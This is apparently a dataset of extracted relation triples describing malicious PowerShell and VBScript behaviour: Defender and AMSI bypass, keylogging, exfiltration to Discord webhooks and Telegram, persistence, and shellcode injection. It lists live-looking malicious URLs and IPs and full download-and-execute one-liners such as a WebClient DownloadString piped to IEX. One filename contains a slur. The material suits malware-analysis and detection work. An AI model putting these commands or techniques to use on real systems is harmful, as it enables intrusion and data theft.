+Logged data	PVI	Saved	%appdata%\Microsoft\Windows\Templates\Pages_Elements.xml	FILE
+The script	SUB	Have	Base64 Encoded Strings	OBF
+The script	SUB	Access	bookmarks	PVI
+serv.vbs	EXE	Execute	serv.ps1	EXE
+The script	SUB	Execute	long byte sequence	OBF
+CreateThread	WAPI	CalledWith	dwStackSize: 0	dwStackSize PARAMETER
+scheduled task	TASK	Scheduled	every 2 minutes	FREQUENCE
+The script	SUB	Rename	extracted files	FILE
+PowerShell remoting	PS COMMAND	Have	Split	Split PARAMETER
+The script	SUB	Use	default credentials	CREDENTIAL PARAMETER
+The script	SUB	Execute	IEX	IEX COMMAND
+The script	SUB	Access	GitHub URLs	URL
+The script	SUB	Execute	.jar file	EXE
+PowerShell remoting	PS COMMAND	Have	-Join	Join PARAMETER
+The script	SUB	Download	Data	FILE
+The script	SUB	Have	obfuscated functions	OBF FUNCTION
+The script	SUB	Create	PowerShell script (GOAGGPXWTREEEOZAACHQCE.ps1)	EXE
+zip file	COMPRESSED FILE	Have	executable files	EXE
+The script	SUB	Create	Scheduled Task	TASK
+The script	SUB	Delete	PowerShell history	DATA
+The script	SUB	Create	WD.PS1	EXE
+The script	SUB	Have	-W Hidden	BYPASS PARAMETER
+The script	SUB	Use	Set-MpPreference	Set-MpPreference cmdlet
+Powershell	PS COMMAND	Have	-eXEC BYPASS	BYPASS PARAMETER
+delegate	DELEGATE	Execute	executable memory	MEMORY
+The script	SUB	Use	-error action	ERROR ACTION PARAMETER
+-error action	ERROR ACTION PARAMETER	Have	silentlycontinue	silentlycontinue VALUE
+PowerShell script	EXE	Hosted	C:\ProgramData	ProgramData PATH
+remote script	EXE	Download	hxxp://example.com/script4.ps1	EXE
+hxxp://example.com/script4.ps1	EXE	Hosted	hxxp://example.com	URL
+The script	SUB	Disable	Archive Scanning	DEFENDER
+Decrypted command	COMMAND	Have	sv Va	Set-Value PARAMETER
+file	FILE	Saved	zip file	COMPRESSED FILE
+netsh	COMMAND	Collect	clear text passwords	PVI
+The script	SUB	Use	sleep commands	SLEEP
+The script	SUB	Execute	web request	WebQuest COMMAND
+Sursdepa.vbs	EXE	Hosted	http://46.4.198.55/10P/	URL
+The script	SUB	Execute	data in allocated memory	DATA
+The script	SUB	Load	.NET assembly	NET ASSEMBLY
+Dropbox	EXTERNAL SERVICE	Hosted	screenshots	PVI
+Send-DiscordMessage function	COMMAND	Connect	Discord webhook URL	WEBHOOK
+The script	SUB	Execute	concatenated command	COMMAND
+VBS file	EXE	Hosted	user's temp directory	TEMP PATH
+The script	SUB	Dencrypt	Base64 string	OBF
+NHCIYUEGJZVIPHCJBJRIOD.ps1	EXE	Use	-ExecutionPolicy Bypass	BYPASS PARAMETER
+The script	SUB	Use	Base64 Encoding and XOR Cipher	OBF
+XX.PS1	EXE	Hosted	directory in C:\ProgramData\WD	ProgramData PATH
+The script	SUB	Execute	10 seconds delay	SLEEP
+The script	SUB	Execute	code in new thread	CODE
+The script	SUB	Execute	20200510.rar	COMPRESSED FILE
+The script	SUB	Delete	tera15.zip	COMPRESSED FILE
+Start-Process	PS COMMAND	Execute	client32.exe	EXE
+executable memory	MEMORY	Have	0x3000 (MEM_COMMIT | MEM_RESERVE)	MEM_COMMIT | MEM_RESERVE ATTRIBUTE
+byte arrays	DATA	Hosted By	$BOOKS	PARAMETER
+The script	SUB	Save	powershell files	EXE
+powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-enc	ENCODED PARAMETER
+powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-NoP -sta -w1	BYPASS PARAMETER
+obfuscated commands	OBF	Execute	Powershell script	EXE
+batch script (Smart.bat)	EXE	Execute	PowerShell script (Smart.ps1)	EXE
+'XboxGameBar' directory	PATH	Hosted	ProgramData folder	ProgramData PATH
+The script	SUB	Copy	shellcode	CODE
+The script	SUB	Load	PresentationCore	PresentationCore ASSEMBLY
+The script	SUB	Load	.NET Assembly	NET ASSEMBLY
+The script	SUB	Define	InfoKey	FUNCTION
+The script	SUB	Execute	Get-Diskinfo	FUNCTION
+Get-Diskinfo	FUNCTION	Collect	disk information	PVI
+iex	IEX COMMAND	Execute	1.exe	EXE
+The script	SUB	Execute	IEx function	IEX COMMAND
+tera15.zip	COMPRESSED FILE	Hosted	https://tera15.b-cdn.net	URL
+The script	SUB	Write	file with random name	FILE
+file with random name	FILE	Have Name	random name	RANDOM STRING
+The script	SUB	Download	http://146.70.87.120:445/doc	CODE
+The script	SUB	React	Ctrl + C or Ctrl + X	KEYBOARD EVENT
+The script	SUB	Use	XOR decryption	FUNCTION
+$txRbsuvSoU	PARAMETER	Have	x86 assembly code	CODE
+screenshots	PVI	Save	%USERPROFILE%\AppData\Local\Temp\	TEMP PATH
+Start-Process	COMMAND	Have	-ArgumentList	/c, del, C:\Temp\file.ps1	PARAMETER
+The script	SUB	Have	$RqJJxvtujbtoiqkyAU	PARAMETER
+$shell	OBF	Have	hexadecimal values	OBF PARAMETER
+batch file	FILE	Scheduled	run on system startup	AutoRun
+PostUpData	FUNCTION	Send	collected data	PVI
+payload	OBF	DecodedTo	large string	DATA
+The script	SUB	Creates	C:\ProgramData\schtasks\Microsoft.bat	EXE
+The script	SUB	Write	install.vbs	EXE
+The script	SUB	Obfuscate	String Replacement	OBF
+GameLoop.ps1	EXE	Execute	dynamic code	COMMAND
+scheduled tasks	TASK	Execute	serv.vbs	EXE
+The script	SUB	Have	kernel32.dll	DLL
+The script	SUB	Execute	purgeMemory.ps1	EXE
+commands	COMMAND	Capture	output	DATA
+received commands	COMMAND	Have	iex	COMMAND
+The script	SUB	OBF	hexadecimal conversion	OBF
+TvMusic.vbs	EXE	Have	Base64 encoded string	OBF
+The script	SUB	Create	Cotrl.bat	EXE
+an executable file	EXE	Downloaded	https://pastebin.com/raw/xxxxxxxx	URL
+The script	SUB	Create	NHCIYUEGJZVIPHCJBJRIOD.ps1	EXE
+The script	SUB	Download	shutdowni.bat	EXE
+TvMusic.vbs	EXE	Execute	PowerShell command	EXE
+logged keystrokes	PVI	Saved	log file in user's temporary folder	PATH
+The script	SUB	Download	files	FILE
+The script	SUB	Use	kernel32.dll functions	WAPI
+The script	SUB	OBF	Base64 strings	OBF
+The script	SUB	Execute	Get-WmiObject	Get-WmiObject COMMAND
+script	SUB	Use	System.Windows.Forms	WAPI
+The script	SUB	Use	Reflective DLL injection	FUNCTION
+powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-sta	sta PARAMETER
+powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-NoP	BYPASS PARAMETER
+powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-w 1	BYPASS PARAMETER
+The script	SUB	Use	try-catch blocks	ACTION
+registry key	REGKEY	Have	-Name 'Path'	PARAMETER
+The script	SUB	Use	custom encryption function	OBF
+The script	SUB	Execute	msi.dll	DLL
+IEX (New-Object Net.WebClient).DownloadString	COMMAND	Have	Invoke-Expression	COMMAND
+script	CLASS	Use	CreateThread	WAPI
+base64-encoded string `$XyybdfuQWuefStm`	OBF	Decode	shellcode	CODE
+The script	SUB	Connect	appyrinceaskeda.com	URL
+The script	SUB	Wait	'start-sleep s 3'	SLEEP
+PowerShell	EXE	Use	VirtualAlloc	WAPI
+The script	SUB	Have	LONG_BYTE_SEQUENCE	OBF
+Invoke-WebRequest	COMMAND	Have	-Hidden	BYPASS PARAMETER
+The script	SUB	Use	VirtualAlloc	WAPI
+The script	SUB	Execute	characters	DATA
+The script	SUB	Send	output of commands	DATA
+The script	SUB	Use	Out-File	Out-File COMMAND
+GetProcAddress	WAPI	Hosted	kernel32.dll	DLL
+The script	SUB	Remove	login data file	FILE
+PowerShell	EXE	Use	Reflective DLL injection	Reflective DLL injection
+IEX	IEX COMMAND	Execute	$WOGCVYBQEFKOSCKEGBGLOU	OBF
+The script	SUB	Create	WebClient object	OBJECT
+Pia7LCEwRGx2iWRfTz7Z5JZsXbAOejdTR7L3v4CG1eeMPKmqDcWm1aFFSiJaBpR73eLKKokpw0yr4McNoKLBYrrg2FKMU2FbVGjb	FUNCTION	Use	AES	ENCRYPTION ALGORITHM
+Byte Array	DATA	CopiedInto	Memory	MEMORY
+The script	SUB	Have	CDGXDSRESFUDZIFORNSEKR	FUNCTION
+The script	SUB	Set	System.Net.ServicePointManager.Expect100Continue	0	ACTION
+webhook URL	EXTERNAL SERVICE	Receive	current username	PVI
+specific file types	FILE	Hosted	user's machine	PATH
+Anti-VM/Anti-Analysis Techniques	ACTION	Include	check for analysis	ACTION
+The script	SUB	Copy	files from MEMEMAN directory	FILE
+The script	SUB	Have	encoded strings	OBF
+New.vbs	PATH	Execute	PowerShell script	EXE
+The script	SUB	Create	scheduled task GOOGLEUpdte	TASK
+Set-MpPreference	COMMAND	Use	-Force	PARAMETER
+The script	SUB	Execute	VBScript	EXE
+VBScript	EXE	Wait	10 seconds	SLEEP
+The script	SUB	Execute	Invoke method	FUNCTION
+garold.zip	ZIPPED FILE	Hosted	https://apknew.ir/garold.zip	EXTERNAL URL
+The script	SUB	Wait	10 seconds	SLEEP
+the script	SUB	Connect	webhook URL	EXTERNAL SERVICE
+http://110.42.135.208:64962/image/22.jpg	FILE	ConvertedTo	byte array	DATA
+The script	SUB	EXECUTE	method 'Execute'	ACTION
+The script	SUB	Copy	modified byte sequence	DATA
+script	SUB	Use	SilentlyContinue	PARAMETER
+The script	SUB	Have	$ueYYiuLu	OBF
+BT.ps1	EXE	Generate	PowerShell script	PS COMMAND
+files on the system	FILE	Include	documents, images, videos, compressed files	TYPES
+The script	SUB	Download	https://cdn.discordapp.com/attachments/.../Seg.txt	URL
+The script	SUB	Use	.NET assembly types	WAPI
+Received data	OBF	Have	PowerShell code	CODE
+The script	SUB	Use	Invoke-Expression	COMMAND
+decoded byte sequence	OBF	Hosted	memory	MEMORY
+The script	SUB	Execute	PowerShell script in temp folder	EXE
+The script	SUB	Download	.txt file	FILE
+Invoke-WebRequest	COMMAND	Have	-OutFile	PARAMETER
+The script	SUB	Use	Telegram API	SERVICE
+The script	SUB	Load	AddVectoredExceptionHandler	WAPI
+The script	SUB	Execute	Friday.Boya	DLL
+collected data	PVI	SentTo	http://hpsj.firewall-gateway.net:80/	URL
+The script	SUB	Send	specific message ('---------connection lost----------')	DATA
+The script	SUB	Executes	Start-Sleep -Seconds 2	COMMAND
+The script	SUB	Execute	Win32Functions	NAMESPACE
+'mercifulHaddock.txt'	FILE	Have	Method 'DrawThemeIcon'	WAPI
+Add-Type cmdlet	COMMAND	Load	PresentationCore .NET assembly	LIBRARY
+The script	SUB	Execute	AMSI Bypass	DEFENDER
+The script	SUB	Executes	Obfuscated code	OBF
+The script	SUB	Execute	http://20.91.206.86/64bits.php	EXE
+The script	SUB	Create	libraries.vbs	EXE
+"handler"  	FUNCTION	Check	EXCEPTION_SINGLE_STEP	ERROR_CODE
+The script	SUB	Execute	Marshal::Copy	WAPI
+'rundll32'	EXE	Load	'mercifulHaddock.txt'	FILE
+YNtlGjuNxDpCPOyweziYRyjlMdBW3KahM0igyGoIt7drnUmy9TjQ9l603H92i9jm3Hpp6Sx8La5jUsyrqCmK1UI1uRMq7W0UnqYf	FUNCTION	Use	AES	ALGORITHM
+The script	SUB	Have	PowerShell and VBScript	EXE
+The script	SUB	Execute	other scripts	SCRIPT
+The script	SUB	Save	peltgon.zip	$env:TEMP	PATH
+The script	SUB	Creates	Delegate	ACTION
+StartupInstall function	Function	Create	VBScript	EXE
+The script	SUB	Execute	encoded commands	OBF
+The script	SUB	Check	system architecture	SYS INFO
+The script	SUB	Download	.jpg file	FILE
+The script	SUB	Define	C# class with DllImport attributes	DLLIMPORT
+Report.ps1	EXE	Hosted	AppData\Roaming folder	PATH
+The script	SUB	Create	temporary directory	PATH
+The script	SUB	Execute	Base64 Encoded Command	OBF
+The script	SUB	Create	a file in C:\ProgramData	FILE
+The script	SUB	Save	vbs files	EXE
+The script	SUB	Execute	client32.exe	EXE
+The script	SUB	WaitUntilFinish	thread	THREAD
+sqmapi.vbs	EXE	Append	PowerShell commands	PS COMMAND
+The script	SUB	Have	-Ep bypass	BYPASS PARAMETER
+scheduled task (mvfp)	TASK	Execute	mvfp.vbs	EXE
+The script	SUB	Execute	Robocopy	COMMAND
+powershell.exe	PS COMMAND	Use	-NOP -WIND HIDDEN -eXEC BYPASS	BYPASS PARAMETER
+The script	SUB	Have	infinite loop	LOOP
+directories and files	FILE	Located in	C:\Windows\System32	SYSTEM PATH
+Ctrl + C	KEYBOARD EVENT	Trigger	clipboard monitoring	ACTION
+The script	SUB	Delete	config.json	FILE
+byte array	MEMORY	Execute	new thread	THREAD
+The script	SUB	DOWNLOAD	tr9.txt	FILE
+The script	SUB	Use	IO.Compression.DeflateStream	COMPRESSION WAPI
+The script	SUB	Write	shellcode	CODE
+The script	SUB	Decompress	a base64 encoded PowerShell script	OBF EXE
+The script	SUB	Execute	c.exe	EXE
+The script	SUB	Collect	Operating system version	PVI
+The script	SUB	Contains	obfuscated code	OBF
+GameLoop.ps1	EXE	Use	reflection	WAPI
+The script	SUB	Use	CreateThread	WAPI
+The script	SUB	Access	user's Downloads folders	PATH
+The script	SUB	Have	Chat ID	Chat ID
+The script	SUB	Write	VBS file	EXE
+scheduled task	TASK	Execute	PowerShell command	PS COMMAND
+scheduled task	TASK	Execute	libraries.vbs	EXE
+VirtualAlloc	WAPI	Create 	memory (0x3000 bytes)	MEMORY
+KeyLogger function	FUNCTION	Have	while ($true)	LOOP
+PowerShell	PS COMMAND	Have	-NoProfile	PARAMETER
+The script	SUB	Use	PowerShell reflection	PowerShell reflection ACTION
+The script	SUB	Access	user's AppData folder	PATH
+memory	MEMORY	Hosted	$kgjFavhe	OBF
+CreateThread	WAPI	Create	new thread	THREAD
+libraries.ps1	EXE	Create	scheduled task	TASK
+Get-Process	COMMAND	Check	msedge.exe	PROCESS
+The script	SUB	Execute	powershell.exe -c (new-object net.webclient).downloadstring('http://10.0.0.1/share/update.exe') | IEX	PS COMMAND
+powershell.exe -c (new-object net.webclient).downloadstring('http://10.0.0.1/share/update.exe') | IEX	PS COMMAND	Download	update.exe	EXE
+PowerShell command	EXE	Connect	remote server	REMOTE HOST
+scheduled task	TASK	Execute	every 1000 minutes	FREQUENCY
+The script	SUB	Define	getit function	FUNCTION
+The script	SUB	Execute	Get-NetIPAddress	Get-NetIPAddress WAPI
+33667344.dll	EXE	Have	#1 function	FUNCTION
+The script	SUB	Execute	schtasks /run /tn TaskName	schtasks /run COMMAND
+XX.vbs	EXE	Execute	XX.bat	EXE
+The script	SUB	Use	SHA1 Havehing	ENCRYPTION ALGORITHM
+The script	SUB	Use	Reflective DLL Injection	Reflective DLL Injection
+The script	SUB	Delete	.docx files	FILE
+file	FILE	Hosted	user's recycle bin folder	BIN PATH
+The script	SUB	Create	C:\ProgramData\TUKHAMTASSER	ProgramData PATH
+The script	SUB	Decode	an encoded string	OBF
+The script	SUB	Use	Marshal.GetDelegateForFunctionPointer	Marshal.GetDelegateForFunctionPointer WAPI
+The script	SUB	Decode	Base64 string	OBF
+client32.exe	EXE	Saved	$pzip	PATH WITH CUSTOMIZED NAME
+CodeDom function	CODE	Execute	method from a compiled assembly	ASSEMBLY
+The script	SUB	Execute	mea71o.apk	EXE
+The script	SUB	Use	Telegram chat ID	Telegram	ACCOUNT
+.docx files	FILE	Saved	user's Downloads and Desktop folders	DOWNLOAD PATH
+POST request	WEB QUEST	Connect	Discord webhook	WEBHOOK
+The script	SUB	Terminate	PowerShell process	PROCESS
+The script	SUB	Use	-ep bypass	BYPASS PARAMETER
+The script	SUB	Create	Delegate	to	execute payload	DELEGATE
+The script	SUB	Download	browser.exe	EXE
+sqmapi.vbs	EXE	Execute	CorSym.ps1 payload	EXE
+The script	SUB	Use	-win hid	BYPASS PARAMETER
+The script	SUB	Access	browsing history	PVI
+The script	SUB	Modify	cookie	COOKIE
+The script	SUB	Execute	string manipulation	OBF
+system information	PVI	Include	operating system	PVI
+operating system version	PVI	SentTo	http://51.132.148.124/brume.php	URL
+Start-job -RunAs32	PS COMMAND	Create	a background job	BACKGROUND JOB
+C:\Users\Owner\AppData\Local\Temp\tmpC47C.tmp	TEMP FILE	Have	stored passwords	PVI
+The script	SUB	Encrypt	code and variable names	OBF
+The script	SUB	Create	Screenshot.vbs	EXE
+IP address	PVI	SentTo	http://51.132.148.124/brume.php	URL
+installed antivirus software	PVI	SentTo	https://clk-info.ru	URL
+The script	SUB	Download	New.vbs	EXE
+The script	SUB	Create	C:\ProgramData\Document\py.ps1	EXE
+webhook URL	WEBHOOK	Receive	clipboard data	PVI
+The script	SUB	Execute	li6s.ba	EXE
+The script	SUB	Execute	System Shutdown	System Shutdown COMMAND
+The script	SUB	Collect	current time	TIME STAMP
+$ZPWeIhCk	OBF	Hosted	x86 assembly code	ASSEMBLY
+The script	SUB	Execute	Invoke-Expression	IEX COMMAND
+The script	SUB	Use	Mimikatz	Mimikatz versatile tool
+The script	SUB	Send	a 'No credentials found.' message	PVI
+The script	SUB	Have	$XyybdfuQWuefStm	OBF
+The script	SUB	Collect	IP address	PVI
+The script	SUB	Disable	IOAV Protection	DEFENDER
+The script	SUB	Download	https://www.escueladeteologiathetruehappiness.com/.NEW/.A.jpg or .B.jpg	FILE
+new thread	THREAD	Execute	$kgjFavhe	OBF
+The script	SUB	Have	infinite loop	LOOP
+The script	SUB	Decode	a base64 encoded string	OBF
+Pictures.bat	EXE	Runs	PowerShell script	PS COMMAND
+the script	SUB	Have	Base64 Encoded Strings	OBF
+registry key	REGKEY	Have	-Value '$env:TEMP\<random_string>.exe'	PARAMETER
+-Value '$env:TEMP\<random_string>.exe'	PARAMETER	ReferTo	TEMP\<random_string>.exe	EXE
+TEMP\<random_string>.exe	EXE	Saved	TEMP	TEMP PATH
+TEMP\<random_string>.exe	EXE	Have Name	random string	RANDOM STRING
+The script	SUB	Modify	registry	REGKEY
+The script	SUB	Execute	p9d2.exe	EXE
+The script	SUB	Collect	PC name	PVI
+custom function VyXbkVlPzUKluabJiFNN	CUSTOMIZED FUNCTION	Decode	base64 encoded strings	OBF
+The script	SUB	Create	Pictures.vbs	EXE
+The script	SUB	Execute	infinite loop (`while (1)`)	LOOP
+The script	SUB	Use	Gzip Compression	COMPRESSION ALGORITHM
+zip file	COMPRESSED FILE	Have	each set of copied files	FILE
+Clipboard content	PVI	SentTo	Discord webhook	WEBHOOK
+The script	SUB	Have	complex byte array ($fHuDQdbdRNHLE)	OBF
+System information	PVI	Include	public and local IP addresses	IP ADDRESS
+text file	FILE	SentTo	Discord webhook	WEBHOOK
+The script	SUB	Have	Base64 Encoding	OBF
+rundll32.exe	EXE	EXPORT	DllRegisterServer	DLLRegister WAPI
+The script	SUB	Execute	base64 encoded string	OBF
+The script	SUB	Use	-eC switch	-eC switch PARAMETER
+The script	SUB	Connect	191.232.181.180	IP ADDRESS
+"handler"	FUNCTION	Check	the address of the exception	MEMORY_ADDRESS
+The script	SUB	Collect	country	PVI
+XX.vbs	EXE	Hosted	directory in C:\ProgramData\WD	ProgramData PATH
+delegate zV2s3	DELEGATE	Call	VirtualAlloc	WAPI
+CorSym.ps1	EXE	Saved	user's directory	PATH
+New-Object Net.WebClient	COMMAND	Connect	https://raw.githubusercontent.com/windowsupdate1/WindowsUpdate/main/WinSecurityUpdate	URL
+The script	SUB	Connect	https://github.com/Somali-Devs/Kematian-Stealer/releases/download/KematianBuild/kematian.bin	URL
+The script	SUB	Use	-ExecutionPolicy Bypass	BYPASS PARAMETER
+The script	SUB	Use	Get-Process	Get-ProcessCOMMAND
+The script	SUB	Create	ABODCSWBRFKGTXCBPITOQG.ps1	EXE
+The script	SUB	Modify	a non-public, static field	static field
+The script	SUB	Send	Detected file	FILE
+user's temp folder	TEMP PATH	Have	$env:computername-Capture.png	FILE
+The script	SUB	Execute	GetAsyncKeyState	GetAsyncKeyState WAPI
+The script	SUB	Use	IO.Compression.DeFlatStream	COMPRESSION WAPI
+The script	SUB	Create	directory C:\ProgramData\WindowsHost\	ProgramData PATH
+$OJTaNtrpGQ	OBF	Loaded	executable memory	MEMORY
+Start-Sleep	COMMAND	Wait	3 seconds	SLEEP
+SetupBypass	FUNCTION	Have	hardware breakpoints	BREAKPOINT
+The script	SUB	Create	delegate	DELEGATE
+6317a573893bde4aeea7e18e	FILE	SavedTo	C:\9fae5d148b89001555132c896879652fe1ca633d35271db34622248e048c78ae.apk	PATH
+The script	SUB	Execute	hidden byte sequence	DATA
+The script	SUB	Write	registry key	REGKEY
+Loader.vbs	EXE	Hosted	AppData\Roaming folder	APPDATA PATH
+libraries.vbs	EXE	Execute	libraries.ps1	EXE
+The script	SUB	Execute	WD.vbs	EXE
+The script	SUB	Have	-nop	BYPASS PARAMETER
+The script	SUB	Create	XX.PS1	EXE
+The script	SUB	Execute	contents of install.ps1	EXE
+The script	SUB	Modify	Microsoft Edge's configuration files	APP CONFIGURATION FILE
+The script	SUB	Upload	Dropbox	EXTERNAL SERVICE
+The script	SUB	Delete	scheduled task "Data"	TASK
+Collected data	DATA	SentTo	Discord webhook	EXTERNAL SERVICE
+Start-Sleep	COMMAND	Have	7 seconds	SLEEP
+The script	SUB	Decrypt	files in the user's application data folder	FILE
+The script	SUB	Decode	DATA	DATA
+The script	SUB	Connect	remote server	URL
+The script	SUB	Check	Files larger than 8MB	FILE WITH CUSTOMIZED SIZE
+QYZZDAOKPZUJIKAFEZWZDV.bat	EXE	Execute	malicious PowerShell script	EXE
+'mercifulHaddock.txt'	FILE	Saved	'C:\users\public' directory	USER PUBLIC PATH
+The script	SUB	Execute	VirtualAlloc Function	WAPI
+The script	SUB	Have	obfuscation	OBF
+Invoke-Expression	COMMAND	Have	-Command	C:\Temp\file.ps1	PARAMETER
+-Command	C:\Temp\file.ps1	PARAMETER	ReferTo	file.ps1	EXE
+C:\Temp\file.ps1	EXE	Saved	C:\Temp	TEMP PATH
+The script	SUB	Have	Obfuscation	OBF
+memory	MEMORY	Have	Base64 decoded payload	OBF
+The script	SUB	Execute	SystemLogin.vbs	EXE
+The script	SUB	Add Exclusion	update64.exe	EXE
+This script	SUB	Use	InvokeWithEvasion	InvokeWithEvasion COMMAND
+This script	SUB	Execute	$bbb	VAR NAME
+Unknown Code	CODE	Derived From	decoded base64 string	OBF
+The script	SUB	Execute	shove.ke	EXE
+The script	SUB	Dencrypt	several Base64 strings	OBF
+The script	SUB	Dencrypt	a long base64 string	OBF
+The script	SUB	Inject	PowerShell script	PS COMMAND
+The script	SUB	Wait	7 seconds	SLEEP
+Reflective DLL Injection	Reflective DLL Injection	Load	decrypted strings	DATA
+VBScript	FILE	Name	GRYOJAPQWXHAESUEWDUYNV.vbs	EXE
+CreateThread	WAPI	Create	new thread	THREAD
+The script	SUB	Decompress	garold.zip	COMPRESSED FILE
+obfuscated commands	OBF	Execute	VBScript	EXE
+VBScript file (Document.vbs)	EXE	Execute	batch file (Loader.bat)	EXE
+PNG image file t.png	FILE	ConvertedTo	.NET assembly	NET ASSEMBLY
+install.vbs	EXE	Hosted	C:\Users\Public\Music\	USER PUBLIC PATH
+Strings	DATA	ConvertedTo	Byte Arrays	OBF
+Decrypted command	COMMAND	TERMINAT	The first process	PROCESS
+The script	SUB	Download	putty.exe	EXE
+Script	EXE	Downloaded	http://www.htgdxvwww.dld.aibl/zp/zp.iblxibl	URL
+The script	SUB	Execute	browser.exe	EXE
+CodeDom function	Function	Use	System.Web.HttpUtility	System.Web.HttpUtility WAPI
+$pe	VAR	Loaded	Reflection.Assembly::Load()	Reflection.Assembly::Load WAPI
+The script	SUB	Inject	RegAsm.exe	EXE
+The script	SUB	Write	a file	FILE
+ONEN0TEupdate	REGKEY	Have Value	path of client32.exe	PATH
+path of client32.exe	PATH	ReferTo	clent32.exe	EXE
+1.bat	EXE	Execute	cgihvzm.ps1	EXE
+The script	SUB	Have	Base64 encoded payload	OBF
+obfuscation techniques	OBF	Include	hexadecimal encoding	OBF
+The script	SUB	Use	XOR Operation	OBF
+The script	SUB	Execute	Set-Content	Set-Content COMMAND
+The script	SUB	Create	xrbnzmj.vbs	EXE
+lock file	FILE	Saved	temp directory	TEMP PATH
+VBScript	EXE	Execute	batch script	CODE
+The script	SUB	Decompress	2.tar	COMPRESSED FILE
+The script	SUB	Send	byte array $Ghost	DATA
+scheduled task	TASK	Execute	VBScript	EXE
+The script	SUB	Create	1.bat	EXE
+.sss and .uuu files	FILE	ChangedTo	.exe and .ahk	EXE
+GitHub repository	URL	Host	'server.exe'	EXE
+The script	SUB	Download	http://222.122.47.27:2143/auth/xmrig.exe	EXE
+The script	SUB	Change	PowerShell execution policy to 'Unrestricted'	PS EXECUTION POLICY
+The script	SUB	Write	file	FILE
+The script	SUB	Have	base64-encoded string	OBF
+The script	SUB	Have	mscorlib.dll	DLL
+The script	SUB	Execute	files	FILE
+$env:USERPROFILE\AppData\Local\Temp\COMPUTERNAME-Capture.png	FILE	UploadedTo	Dropbox	EXTERNAL SERVICE
+The script	SUB	Write	several files	FILE
+The script	SUB	Create	scheduled task named "Nothing"	TASK
+runner.exe	EXE	Saved	Windows system directory	SYSTEM PATH
+Base64 string	OBF	SavedAs	Run.BAT	EXE
+The script	SUB	Create	QYZZDAOKPZUJIKAFEZWZDV.vbs	EXE
+other scripts	SCRIPT	Saved	C:\ProgramData	ProgramData PATH
+allocated memory	MEMORY	Execute	$sc variable	VAR
+The script	SUB	Execute	shutdowni.bat	EXE
+tr.zip	COMPRESSED FILE	Hosted	https://eylulsifalatas.com/baot.zip	URL
+The script	SUB	Decrypt	base64 string	DATA
+install.vbs	EXE	Execute	PowerShell scripts	EXE
+base64 string	OBF	Have	Invoke-Expression	IEX COMMAND
+.lnk file	SHORTCUT	Hosted	ProgramData folder	ProgramData PATH
+XX.PS1	EXE	Hosted	directory in ProgramData	ProgramData PATH
+The script	SUB	Have	base64 encoded strings	OBF
+The script	SUB	Decompress	Payload	DATA
+the script	SUB	Check	OS is Windows 7 or earlier	SYSINFO
+README.txt	FILE	Associated with	encrypted files	FILE
+The script	SUB	Check	McAfee files	DEFENDER
+The script	SUB	Write	C:\Users\Owner\AppData\Local\Temp\tmpE69A.tmp	FILE
+PowerShell script	SUB	Create	%TEMP%	TEMP PATH
+PowerShell-related files	PS COMMAND	Hosted	user's AppData folder	PATH
+The script	SUB	Execute	a remote file	FILE
+Report.ps1	EXE	Have	obfuscated code	OBF
+$e+$r	VAR	Uploaded	$p$s/fef40df7	URL
+The script	SUB	Create	delegate	POINTER
+The script	SUB	Execute	code within the assembly	ASSEMBLY
+Invoke-Expression	IEX COMMAND	Have	$HB variable	PARAMETER
+The script	SUB	Download	a file	FILE
+The script	SUB	Clear	Run keys	RegKey
+The script	SUB	Import	kernel32.dll	DLL
+batch file	EXE	Have	-WindowStyle Hidden	BYPASS PARAMETER
+The script	SUB	Create	a scheduled task	TASK
+The script	SUB	Create	PowerShell script	EXE
+The script	SUB	Delete	nipplesnigger	FILE
+$ZfDKILmKGboYJ	OBF	CopiedTo	memory	MEMORY
+hexadecimal string	OBF	ConvertedTo	byte array	DATA
+The script	SUB	Collect	Ctrl+C and Ctrl+X key presses	KEYBOARD EVENT
+scheduled task	TASK	Set	run every 2 minutes starting from January 1, 2023	FREQUENCY
+The script	SUB	Execute	CodeDom function	CODE
+PowerShell script	PS COMMAND	Execute	running process	PROCESS
+infinite loop	LOOP	WAIT	manually stopped or system restarted	CONDITION
+scheduled task GOOGLEUpdte	TASK	Execute	ETC.vbs	EXE
+Non-Interactive	PARAMETER	Have	-nop	BYPASS PARAMETER
+The script	SUB	Have	CreateThread	WAPI
+The script	SUB	Create	HKCU:\Software\aignes\	REGKEY
+The script	SUB	Defines	$hBFNIeMq	OBF
+The script	SUB	Use	Obfuscation techniques	OBF
+The script	SUB	Download	file.zip	FILE
+remote script	REMOTE CODE	Hosted	http://10.0.0.10:8080/ps1	URL
+PowerShell	PS COMMAND	Execute	C:\ProgramData\QYZZDAOKPZUJIKAFEZWZDV\JFDYGCGQSVKDBTJPTJZDTE.ps1	EXE
+The script	SUB	Terminate	msbuild	PROCESS
+the script	SUB	Define	YNtlGjuNxDpCPOyweziYRyjlMdBW3KahM0igyGoIt7drnUmy9TjQ9l603H92i9jm3Hpp6Sx8La5jUsyrqCmK1UI1uRMq7W0UnqYf	CUSTOMIZED FUNCTION
+The script	SUB	Collect	operating system version	PVI
+The script	SUB	Detect	Anti-VM/Anti-Analysis Techniques	DEFENDER
+The script	SUB	Create	'PDF' directory in ProgramData	ProgramData PATH
+results of executed commands	DATA	Uploaded	remote server	REMOTE HOST
+GitHub	EXTERNAL SEVICE	Have	'ngrok.exe'	EXE
+The script	SUB	Have	-NoP	BYPASS PARAMETER
+The script	SUB	Download	http://23.227.202.198:443/two	FILE
+decoded PowerShell script	PS COMMAND	Delete	files and directories	FILE
+PowerShell script (Nothing.ps1)	EXE	Dencrypt	a long byte sequence	OBF
+web request	COMMAND	Connect	https://88.198.222.90/file/sample/6317a573893bde4aeea7e18e/	URL
+The script	SUB	Download	WinSecurityUpdate	FILE
+clipboard contents	PVI	SentTo	Discord webhook	EXTERNAL SERVICE
+The script	SUB	Execute	IEX (New-Object Net.WebClient).DownloadString	IEX COMMAND
+IEX (New-Object Net.WebClient).DownloadString	IEX COMMAND	Download	string	DATA
+data from connection	DATA	Execute	iex	IEX COMMAND
+install.ps1	EXE	Saved	file in Public folder	FILE
+BT.vbs	EXE	Generate	VBScript	EXE
+The script	SUB	Use	Telegram bot	BOT
+The script	SUB	Execute	shellcode	EXE
+The script	SUB	Execute	Downloaded data	COMMAND
+The script	SUB	Use	AES encryption	ENCRYPTION ALGORITHM
